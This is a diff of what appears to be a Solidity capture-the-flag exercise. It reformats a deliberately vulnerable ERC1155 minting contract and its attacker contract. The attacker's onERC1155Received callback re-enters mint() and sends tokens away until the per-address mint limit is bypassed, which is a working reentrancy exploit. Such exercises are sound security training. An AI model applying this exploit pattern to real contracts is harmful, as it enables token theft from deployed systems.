@@ -18,7 +18,10 @@ contract Overmint1_ERC1155 is ERC1155 {
         amountMinted[msg.sender][id]++;
     }
 
-    function success(address _attacker, uint256 id) external view returns (bool) {
+    function success(
+        address _attacker,
+        uint256 id
+    ) external view returns (bool) {
         return balanceOf(_attacker, id) == 5;
     }
 }
@@ -36,12 +39,18 @@ contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
         victim.mint(0, "");
     }
 
-    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
+    function onERC1155Received(
+        address,
+        address,
+        uint256,
+        uint256,
+        bytes calldata
+    ) external returns (bytes4) {
         victim.safeTransferFrom(address(this), owner, 0, 1, "");
         if (victim.balanceOf(owner, 0) < 5) {
             victim.mint(0, "");
         }
-        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
+        return this.onERC1155Received.selector;
     }
 
     function onERC1155BatchReceived(
@@ -52,5 +61,7 @@ contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
         bytes calldata
     ) external pure returns (bytes4) {}
 
-    function supportsInterface(bytes4 interfaceId) external view returns (bool) {}
+    function supportsInterface(
+        bytes4 interfaceId
+    ) external view returns (bool) {}
 }
